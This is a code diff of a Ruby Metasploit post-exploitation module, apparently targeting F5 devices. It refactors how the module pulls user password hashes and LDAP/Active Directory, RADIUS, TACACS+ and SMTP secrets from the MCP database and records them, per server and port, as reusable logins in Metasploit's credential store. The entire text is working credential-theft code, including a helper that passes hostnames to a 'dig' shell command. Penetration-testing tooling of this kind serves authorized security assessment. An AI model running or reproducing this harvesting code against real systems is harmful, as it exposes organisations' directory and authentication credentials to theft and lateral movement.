@@ -40,15 +40,15 @@ class MetasploitModule < Msf::Post
 
     register_options(
       [
-        OptBool.new('GATHER_HASHES', [true, 'Gather password hashes from mcp', true]),
-        OptBool.new('GATHER_SERVICE_PASSWORDS', [true, 'Gather upstream passwords (ie, LDAP, AD, RADIUS, etc) from mcp', true]),
+        OptBool.new('GATHER_HASHES', [true, 'Gather password hashes from MCP', true]),
+        OptBool.new('GATHER_SERVICE_PASSWORDS', [true, 'Gather upstream passwords (ie, LDAP, AD, RADIUS, etc) from MCP', true]),
         OptBool.new('GATHER_DB_VARIABLES', [true, 'Gather database variables (warning: slow)', false]),
       ]
     )
   end
 
   def gather_hashes
-    print_status('Gathering users and password hashes from mcp')
+    print_status('Gathering users and password hashes from MCP')
     users = mcp_simple_query('userdb_entry')
 
     unless users
@@ -56,9 +56,8 @@ class MetasploitModule < Msf::Post
       return
     end
 
-    loot = []
     users.each do |u|
-      vprint_good("#{u['userdb_entry_name']} / #{u['userdb_entry_passwd']}")
+      print_good("#{u['userdb_entry_name']}:#{u['userdb_entry_passwd']}")
 
       create_credential(
         jtr_format: Metasploit::Framework::Hashes.identify_hash(u['userdb_entry_passwd']),
@@ -70,77 +69,85 @@ class MetasploitModule < Msf::Post
         username: u['userdb_entry_name'],
         workspace_id: myworkspace_id
       )
-      loot << "#{u['userdb_entry_name']}:#{u['userdb_entry_passwd']}"
     end
-
-    print_good("Users and password hashes stored in #{store_loot('f5.passwords', 'text/plain', session, loot.join("\n"), nil, 'F5 Password Hashes')}")
   end
 
   def gather_upstream_passwords
-    results = []
-    print_status('Gathering upstream passwords from mcp')
+    print_status('Gathering upstream passwords from MCP')
 
     vprint_status('Trying to fetch LDAP / Active Directory configuration')
-    ldap_config = mcp_simple_query('auth_ldap_config')
+    ldap_config = mcp_simple_query('auth_ldap_config') || []
+    ldap_config.select! { |config| config['auth_ldap_config_bind_pw'] }
     if ldap_config.empty?
       print_status('No LDAP / Active Directory password found')
     else
       ldap_config.each do |config|
-        if config['auth_ldap_config_bind_pw']
-          results << "LDAP: #{config['auth_ldap_config_bind_dn']} / #{config['auth_ldap_config_bind_pw']} (server(s): #{config['auth_ldap_config_servers'].join(', ')})"
+        config['auth_ldap_config_servers'].each do |server|
+          report_cred(
+            username: config['auth_ldap_config_bind_dn'],
+            password: config['auth_ldap_config_bind_pw'],
+            host: server,
+            port: config['auth_ldap_config_port'],
+            service_name: (config['auth_ldap_config_ssl'] == 1 ? 'ldaps' : 'ldap')
+          )
         end
       end
     end
 
     vprint_status('Trying to fetch Radius configuration')
-    radius_config = mcp_simple_query('radius_server')
+    radius_config = mcp_simple_query('radius_server') || []
+    radius_config.select! { |config| config['radius_server_secret'] }
     if radius_config.empty?
       print_status('No Radius password found')
     else
       radius_config.each do |config|
-        if config['radius_server_secret']
-          results << "Radius secret: #{config['radius_server_secret']} (server: #{config['radius_server_server']})"
-        end
+        report_cred(
+          password: config['radius_server_secret'],
+          host: config['radius_server_server'],
+          port: config['radius_server_port'],
+          service_name: 'radius'
+        )
       end
     end
 
     vprint_status('Trying to fetch TACACS+ configuration')
-    tacacs_config = mcp_simple_query('auth_tacacs_config')
+    tacacs_config = mcp_simple_query('auth_tacacs_config') || []
+    tacacs_config.select! { |config| config['auth_tacacs_config_secret'] }
     if tacacs_config.empty?
       print_status('No TACACS+ password found')
     else
       tacacs_config.each do |config|
-        if config['auth_tacacs_config_secret']
-          results << "TACACS+ secret: #{config['auth_tacacs_config_secret']} (server(s): #{config['auth_tacacs_config_servers'].join(', ')})"
+        config['auth_tacacs_config_servers'].each do |server|
+          report_cred(
+            password: config['auth_tacacs_config_secret'],
+            host: server,
+            port: 49,
+            service_name: 'tacacs+'
+          )
         end
       end
     end
 
     vprint_status('Trying to fetch SMTP configuration')
-    smtp_config = mcp_simple_query('smtp_config')
+    smtp_config = mcp_simple_query('smtp_config') || []
+    smtp_config.select! { |config| config['smtp_config_username'] }
     if smtp_config.empty?
       print_status('No SMTP password found')
     else
       smtp_config.each do |config|
-        if config['smtp_config_username']
-          results << "SMTP account: #{config['smtp_config_username']} / #{config['smtp_config_password']} (server(s): #{config['smtp_config_smtp_server_address']}:#{config['smtp_config_smtp_server_port']})"
-        end
+        report_cred(
+          username: config['smtp_config_username'],
+          password: config['smtp_config_password'],
+          host: config['smtp_config_smtp_server_address'],
+          port: config['smtp_config_smtp_server_port'],
+          service_name: 'smtp'
+        )
       end
-    end
-
-    if results.empty?
-      print_warning('No service passwords found')
-    else
-      if datastore['VERBOSE']
-        results.each { |r| print_good(r) }
-      end
-
-      print_good("Passwords stored in #{store_loot('f5.service.passwords', 'text/plain', session, results.join("\n"), nil, 'F5 Service Passwords')}")
     end
   end
 
   def gather_db_variables
-    print_status('Fetching db variables from mcp (this takes a bit)...')
+    print_status('Fetching db variables from MCP (this takes a bit)...')
     vars = mcp_simple_query('db_variable')
 
     unless vars
@@ -151,6 +158,56 @@ class MetasploitModule < Msf::Post
     vars.each do |v|
       print_good "#{v['db_variable_name']} => #{v['db_variable_value']}"
     end
+  end
+
+  def resolve_host(hostname)
+    ip = nil
+    if session.type == 'meterpreter' && session.commands.include?(Rex::Post::Meterpreter::Extensions::Stdapi::COMMAND_ID_STDAPI_NET_RESOLVE_HOST)
+      result = session.net.resolve.resolve_host(hostname)
+      ip = result[:ip] if result
+    else
+      result = cmd_exec("dig +short '#{hostname}'")
+      ip = result.strip unless result.blank?
+    end
+
+    vprint_warning("Failed to resolve hostname: #{hostname}") unless ip
+
+    ip
+  rescue Rex::Post::Meterpreter::RequestError => e
+    elog("Failed to resolve hostname: #{hostname.inspect}", error: e)
+  end
+
+  def report_cred(opts)
+    netloc = "#{opts[:host]}:#{opts[:port]}"
+    print_good("#{netloc.ljust(21)} - #{opts[:service_name]}: '#{opts[:username]}:#{opts[:password]}'")
+
+    if opts[:host] && !Rex::Socket.is_ip_addr?(opts[:host])
+      opts[:host] = resolve_host(opts[:host])
+    end
+
+    service_data = {
+      address: opts[:host],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: opts.fetch(:protocol, 'tcp'),
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      post_reference_name: refname,
+      session_id: session_db_id,
+      origin_type: :session,
+      private_data: opts[:password],
+      private_type: :password,
+      username: opts[:username]
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED
+    }.merge(service_data)
+
+    create_credential_login(login_data)
   end
 
   def run
